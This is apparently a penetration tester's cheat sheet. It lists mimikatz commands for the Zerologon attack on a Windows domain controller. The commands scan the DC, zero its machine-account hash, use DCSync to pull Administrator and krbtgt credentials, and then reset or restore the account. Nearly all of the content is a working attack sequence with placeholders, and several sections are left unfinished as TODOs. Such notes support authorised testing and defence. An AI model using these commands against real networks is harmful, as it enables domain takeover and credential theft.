# Living off the Land

TODO: Fill this info

## 01 - Scan Domain Controller

```
lsadump::zerologon /target:'<domain_controller_IP>' /account:'DC_account$'
```

## 02 - Exploit

```
# Exploit the vulnerability: set the NT hash to \x00*8
lsadump::zerologon /exploit /target:'Domain_controller' /account:'DC_account$'

# Obtain the krbtgt by DCSync
lsadump::dcsync /domain:'Domain' /dc:'Domain_controller' /user:'Administrator' /authuser:'DC_account$' /authdomain:'Domain' /authpassword:'' /authntlm

# Reset the DC account's password in AD and in its SAM base
lsadump::postzerologon /target:'Domain_Controller' /account:'DC_account$'

# (alternative to postezerologon) Find the previous NT hash
//TODO

# (alternative to postezerologon) Change the NT hash of the domain controller machine account in the AD back to its original value
lsadump::changentlm /server:'Domain_controller' /user:'DC_account$' /oldntlm:'31d6cfe0d16ae931b73c59d7e0c089c0' /newntlm:'previous_NThash'
```

---
## References

### The Hacker Recipes

- [The Hacker Recipes: zerologon](https://tools.thehacker.recipes/mimikatz/modules/lsadump/zerologon)

- [The Hacker Recipes: postzerologon](https://tools.thehacker.recipes/mimikatz/modules/lsadump/postzerologon)